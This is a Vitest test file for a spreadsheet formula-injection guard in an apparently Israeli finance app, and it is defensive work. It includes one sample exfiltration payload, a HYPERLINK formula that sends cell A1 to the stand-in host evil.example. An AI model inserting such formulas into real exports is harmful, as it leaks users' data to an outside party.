import { describe, expect, it } from "vitest";
import { isFormulaInjectionRisk, neutralizeFormulaInjection } from "./formula-injection";
import { parseShekelsToAgorot } from "../money";

describe("neutralizeFormulaInjection", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])("prefixes a leading %j with a single quote", (char) => {
    expect(neutralizeFormulaInjection(`${char}SUM(A1:A9)`)).toBe(`'${char}SUM(A1:A9)`);
  });

  it("neutralizes a realistic exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.example?d="&A1,"Click me")';
    expect(neutralizeFormulaInjection(payload)).toBe(`'${payload}`);
  });

  it("leaves ordinary merchant text untouched", () => {
    expect(neutralizeFormulaInjection("Rami Levy [רמי לוי]")).toBe("Rami Levy [רמי לוי]");
  });

  it("leaves an empty string untouched", () => {
    expect(neutralizeFormulaInjection("")).toBe("");
  });

  it("only inspects the FIRST character — a mid-string = is not a formula", () => {
    expect(neutralizeFormulaInjection("Total=100")).toBe("Total=100");
  });

  it("does not double-prefix an already-neutralized value", () => {
    const once = neutralizeFormulaInjection("=cmd");
    expect(neutralizeFormulaInjection(once)).toBe(once);
  });
});

describe("isFormulaInjectionRisk", () => {
  it("flags trigger characters and clears ordinary text", () => {
    expect(isFormulaInjectionRisk("@import")).toBe(true);
    expect(isFormulaInjectionRisk("Shufersal")).toBe(false);
    expect(isFormulaInjectionRisk("")).toBe(false);
  });
});

describe("the negative-amount trap this guard must never be applied to", () => {
  it("would corrupt a legitimate debit amount if applied to a numeric cell", () => {
    // This is the whole reason neutralization is scoped to free-text
    // fields only (see formula-injection.ts's header). A blanket
    // "sanitize every cell" pass produces "'-125.50", which is no longer
    // parseable as money — proven here rather than merely asserted in a
    // comment, so the constraint fails loudly if anyone widens the guard.
    const naivelySanitized = neutralizeFormulaInjection("-125.50");
    expect(naivelySanitized).toBe("'-125.50");
    expect(() => parseShekelsToAgorot(naivelySanitized)).toThrow();

    // Whereas the raw amount cell, left alone, parses correctly.
    expect(parseShekelsToAgorot("-125.50")).toBe(-12550);
  });
});
